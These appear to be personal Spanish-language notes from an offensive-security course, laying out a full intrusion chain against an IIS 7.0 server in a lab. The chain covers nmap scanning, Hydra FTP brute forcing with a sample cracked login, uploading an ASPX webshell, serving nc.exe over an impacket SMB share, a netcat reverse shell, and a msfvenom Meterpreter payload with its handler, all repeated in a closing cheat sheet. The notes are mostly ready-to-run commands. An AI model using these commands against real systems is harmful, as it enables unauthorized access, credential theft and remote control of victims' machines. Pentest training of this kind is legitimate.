# IIS / FTP / Webshell — notas prácticas

**Autor:** Josema — [LinkedIn](https://www.linkedin.com/in/jose-manueltr/)
**Fuente:** Curso "El Rincón del Hacker" (Mario) — apuntes personales


> ⚠️ Uso legal: estos apuntes son exclusivamente para laboratorios y entornos autorizados. No realices estas acciones contra sistemas ajenos sin permiso explícito.

---

## Objetivo

Detectar un servicio HTTP corriendo Microsoft IIS (ej. IIS 7.0), enumerar FTP, realizar pruebas controladas de acceso, subir un webshell ASPX (en entorno de laboratorio), y obtener una shell remota/upgrade a Meterpreter para pruebas posteriores de post-explotación.

---

## 1) Detección HTTP — Microsoft IIS 7.0

* Si `nmap -sV` detecta `Microsoft IIS httpd 7.0` ya sabes que es un servidor Windows con IIS 7.x.
* IIS 7.0 es relativamente antiguo; algunas versiones tienen vulnerabilidades históricas conocidas (por ejemplo, desbordamientos o configuraciones inseguras) — en laboratorio puedes comprobar CVE concretos si la versión y los módulos coinciden.

Comando recomendado para detección básica:

```bash
sudo nmap -sV -p 80,443 --script http-enum,http-title 10.0.8.15
```

**Qué mirar:** encabezados HTTP, `Server:` (puede indicar IIS y versión), páginas por defecto (`index.html`, `iisstart.htm`) y directorios expuestos.

---

## 2) FTP — fuerza bruta con Hydra (LAB)

Si detectas FTP en el puerto 21 y quieres comprobar acceso con muchas cuentas:

```bash
hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt \
      -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt \
      ftp://10.0.8.15
```

Salida ejemplo (éxito):

```
[21][ftp] host: 10.0.8.15   login: info   password: PolniyPizdec0211
```

**Interpretación:** credenciales válidas para el servicio FTP. Recuerda: fuerza bruta es muy ruidosa y puede ser detectada/bloqueada.

---

## 3) Interactuar con FTP (subida de archivos)

Con credenciales válidas:

```bash
ftp 10.0.8.15
# login: info
# password: <password>
ftp> dir
ftp> put cmdasp.aspx
```

Salida tipo `dir` muestra archivos y permisos (`aspnet_client`, `index.html`, etc.). Si el directorio del servidor web es escribible desde FTP (poco común, pero posible), subir `cmdasp.aspx` permitirá ejecutar código ASPX vía navegador en `http://10.0.8.15/cmdasp.aspx`.

---

## 4) Encontrar y preparar webshells y binarios

* Kali incluye webshells en `/usr/share/webshells/aspx/` (ej.: `cmdasp.aspx`).
* Busca `nc.exe` o `netcat` para usar como payload remoto si lo necesitas:

```bash
find / -name cmdasp.aspx 2>/dev/null
find / -name nc.exe 2>/dev/null
sudo cp /usr/share/webshells/aspx/cmdasp.aspx ./
sudo cp /usr/share/windows-resources/binaries/nc.exe ./
```

---

## 5) Compartir recursos con Impacket (cuando interesa servir binarios)

`impacket-smbserver` sirve tu directorio local como recurso SMB para que la víctima pueda descargar archivos sin necesidad de abrir puertos entrantes en tu máquina.

```bash
impacket-smbserver recurso $(pwd) -smb2support
```

**¿Por qué usarlo?**

* Evita tener que subir el binario por FTP si el FTP no permite escritura en la carpeta web.
* Permite que la víctima haga `copy \\ATTACKER\recurso\nc.exe` para traer `nc.exe` desde tu Kali.

**Comandos útiles/observaciones:**

* `impacket-smbserver` mostrará conexiones y peticiones SMB del objetivo.
* Asegúrate del nombre del recurso y la ruta (`$(pwd)` apunta al directorio donde estén `nc.exe` o `shell.exe`).

---

## 6) Listener y ejecución remota (netcat)

En Kali abre un listener:

```bash
sudo nc -nvlp 443    # escucha en el puerto 443 (TCP)
```

En la máquina víctima, desde la pseudo-shell ASPX o desde un `cmd.exe` si tienes acceso, ejecuta (ejemplo):

```
\\10.0.8.12\recurso\nc.exe -e cmd.exe 10.0.8.12 443
```

Si todo funciona, el `nc` conectado lanzará `cmd.exe` y verás una shell remota en tu listener.

**Nota:** `-e` es peligroso y muchos `nc` modernos no lo soportan por diseño. En laboratorio sirve para pruebas rápidas.

---

## 7) Subir un payload más estable y elevar (usar msfvenom / meterpreter)

Genera un payload Windows Meterpreter en formato `.exe`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.8.12 LPORT=444 -f exe -o shell.exe
```

Sirve `shell.exe` con `impacket-smbserver`, cópialo desde la víctima a `C:\Windows\Temp` y ejecútalo:

```
copy \\10.0.8.12\recurso\shell.exe shell.exe
shell.exe
```

En Kali prepara el handler en Metasploit:

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.8.12
set LPORT 444
run
```

Si se conecta, tendrás `meterpreter>` y podrás utilizar módulos de post-explotación.

---

## 8) Cuándo usar un recurso SMB vs FTP

* **FTP**: si permite escritura y apunta al directorio web, es la forma más directa de subir webshells.\
* **SMB (impacket-smbserver)**: útil cuando FTP no escribe en la carpeta web pero la víctima puede acceder a recursos UNC (`\\attacker\share`). También es ideal para servir binarios sin exponer un servidor HTTP.

---

## 9) Seguridad, detección y buenas prácticas

* Documenta todo: comandos, salidas y rutas.\
* Nunca subas al repo binarios con payloads activos ni credenciales reales.\
* Usa puertos no estándar con precaución (p. ej. 443) — pueden chocar con servicios locales.\
* Limpia artefactos en entornos de práctica si es parte del ejercicio.\
* Evita `-e` en netcat en entornos reales; preferir técnicas más modernas y menos obvias.

---

## 10) Resumen rápido (cheatsheet)

```bash
# detectar IIS
sudo nmap -sV -p 80 10.0.8.15

# fuerza bruta FTP (LAB)
hydra -L usernames.txt -P passwords.txt ftp://10.0.8.15

# conectar por ftp y subir webshell
ftp 10.0.8.15
put cmdasp.aspx

# servir binarios con impacket
impacket-smbserver recurso $(pwd) -smb2support

# listener netcat
sudo nc -nvlp 443

# generar payload meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.8.12 LPORT=444 -f exe -o shell.exe

# handler en msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.8.12
set LPORT 444
run
```

---

